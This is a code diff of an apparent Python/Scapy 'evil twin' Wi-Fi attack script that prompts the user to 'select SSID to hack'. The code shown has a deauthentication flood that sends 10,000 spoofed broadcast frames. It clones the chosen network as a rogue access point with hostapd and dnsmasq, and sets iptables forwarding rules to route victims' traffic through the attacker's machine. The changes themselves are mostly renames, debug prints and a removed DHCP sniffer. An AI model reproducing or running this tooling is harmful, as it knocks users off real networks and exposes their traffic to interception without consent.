@@ -10,18 +10,18 @@ from scapy.layers.http import HTTPRequest
 import json
 from scapy.layers.inet import IP
 
-aps_dict = {}
+ap_list = {}
 
 def print_wifi_list():
     header = PrettyTable(['SSID', 'MAC ADRESS'])
-    for ssid, mac_beacons in aps_dict.items():
+    for ssid, mac_beacons in ap_list.items():
         header.add_row([ssid, str(mac_beacons)])
     print(header)
 
 
 def choose_ssid():
     ssid_temp = input("Select SSID to hack \t")
-    if ssid_temp in aps_dict:
+    if ssid_temp in ap_list:
         return ssid_temp
     else:
         print(f"{ssid_temp} is currently unavailable")
@@ -29,19 +29,18 @@ def choose_ssid():
 
 
 def deauth_attack(gateway_mac, interface):
-    print("hello" + gateway_mac)
+    print("hello " + gateway_mac)
     target_mac = "ff:ff:ff:ff:ff:ff"
     #target_mac = "08:c5:e1:87:79:c1"
-
     packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
     sendp(packet, iface=interface, count=10000, inter=0.1)
 
 
 def create_fake_ap(ssid, interface):
+    print("create_fake_ap")
     nameOfDir = "Fake_AP"
     nameConfFile = f"{nameOfDir}/hostapd.conf"
-    channel = 6
-    ssid = "dumyWifi"
+    channel = 11
     text = f'interface={interface}\n' \
            f'driver=nl80211\n' \
            f'ssid={ssid}\n' \
@@ -73,6 +72,7 @@ def change_host_file():
 
 
 def dnsmasq_service(interface):
+    print("dnsmasq_service")
     nameOfDir = "Fake_AP"
     nameConfFile = f"{nameOfDir}/dnsmasq.conf"
     ip_Range = '192.168.1.2,192.168.1.30,255.255.255.0,12h'
@@ -99,6 +99,7 @@ def dnsmasq_service(interface):
 
 
 def fowardTraffic():
+    print("fowardTraffic")
     os.system('iptables --table nat --append POSTROUTING --out-interface wlp2s0 -j MASQUERADE')
     os.system('iptables --append FORWARD --in-interface wlan0mon -j ACCEPT')
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
@@ -110,20 +111,12 @@ def write_file(fName, text, mode='w'):
     f.close()
 
 
-def DHCPHandler(packet):
-    if DHCP in packet and packet[DHCP].options[0][1] == 5:
-        print(f"{packet[IP].dst} connected!")
-
-
-def sniffDHCP(interface):
-    while True:
-        sniff(filter="udp and (port 67 or 68)", prn=DHCPHandler, iface=interface)
 
 
 def scanWifi(pkt):
     if pkt.haslayer(Dot11Beacon):  
         if pkt.type == 0 and pkt.subtype == 8:  
-                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3)
+                ap_list[pkt.info.decode("utf-8")] = (pkt.addr3)
                 
         
 
@@ -138,9 +131,9 @@ if __name__ == '__main__':
     start_monitor_airmon(interfaceName)
     print("Start Deauthentication attack on " + ssid)
     interfaceName = "wlan0mon"
-    #deauth_attack(aps_dict[ssid][0], interfaceName)
+    #deauth_attack(ap_list[ssid], interfaceName)
     start_new_thread(create_fake_ap, (ssid, interfaceName,))
     start_new_thread(fowardTraffic, ())
     start_new_thread(dnsmasq_service, (interfaceName,))
     time.sleep(10)
-    start_new_thread(sniffDHCP, (interfaceName,))
+
